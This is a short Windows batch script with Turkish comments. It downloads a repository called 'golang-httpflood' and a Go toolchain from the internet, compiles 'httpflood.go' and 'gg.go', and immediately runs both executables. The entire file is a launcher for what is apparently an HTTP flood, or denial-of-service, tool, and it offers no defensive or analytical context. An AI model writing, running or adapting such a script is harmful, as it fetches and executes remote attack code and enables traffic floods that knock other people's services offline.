@echo off
REM PowerShell kullanarak repositoriyi indir
powershell -Command "Invoke-WebRequest -Uri https://github.com/murmurlab/golang-httpflood/archive/refs/heads/main.zip -OutFile %USERPROFILE%\flo.zip"

REM Dosyayı hedef dizine çıkar
powershell -Command "Expand-Archive -Path %USERPROFILE%\flo.zip -DestinationPath %USERPROFILE%\flo"

REM Go'yu indir
powershell -Command "Invoke-WebRequest -Uri https://go.dev/dl/go1.19.4.windows-amd64.zip -OutFile %USERPROFILE%\gol.zip"

REM Go'yu çıkar
powershell -Command "Expand-Archive -Path %USERPROFILE%\gol.zip -DestinationPath %USERPROFILE%"

REM Go binary yolunu ayarla
set GOPATH=%USERPROFILE%\go
set PATH=%PATH%;%GOPATH%\bin

REM Go dosyalarını derle
%USERPROFILE%\go\bin\go.exe build %USERPROFILE%\flo\golang-httpflood-main\httpflood.go
%USERPROFILE%\go\bin\go.exe build %USERPROFILE%\flo\golang-httpflood-main\gg.go

REM Çıktıları çalıştır
%USERPROFILE%\flo\golang-httpflood-main\httpflood.exe
%USERPROFILE%\flo\golang-httpflood-main\gg.exe
